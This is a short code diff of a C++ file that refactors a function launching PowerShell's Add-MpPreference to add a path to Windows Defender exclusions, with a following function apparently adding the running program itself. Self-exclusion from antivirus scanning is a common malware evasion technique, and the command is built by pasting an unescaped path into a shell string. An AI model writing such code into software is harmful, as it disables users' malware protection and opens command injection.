@@ -7,22 +7,19 @@
 #include <iostream>
 #include <string>
 
-bool AddToDefenderExclusions(const std::wstring& filePath) {
-    std::wstring command = L"powershell -Command \"Add-MpPreference -ExclusionPath '";
-    command += filePath;
-    command += L"'\"";
-
+bool AddToDefenderExclusions(const std::wstring& path) {
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi;
-    if (CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-        WaitForSingleObject(pi.hProcess, INFINITE);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        printSuccess("Added to Windows Defender exclusions");
-        return true;
+    std::wstring command = L"powershell Add-MpPreference -ExclusionPath \"" + path + L"\"";
+
+    if (!CreateProcessW(nullptr, &command[0], nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
+        return false;
     }
-    printError("Failed to add to Windows Defender exclusions");
-    return false;
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    return true;
 }
 
 bool AddCurrentExecutableToDefenderExclusions() {
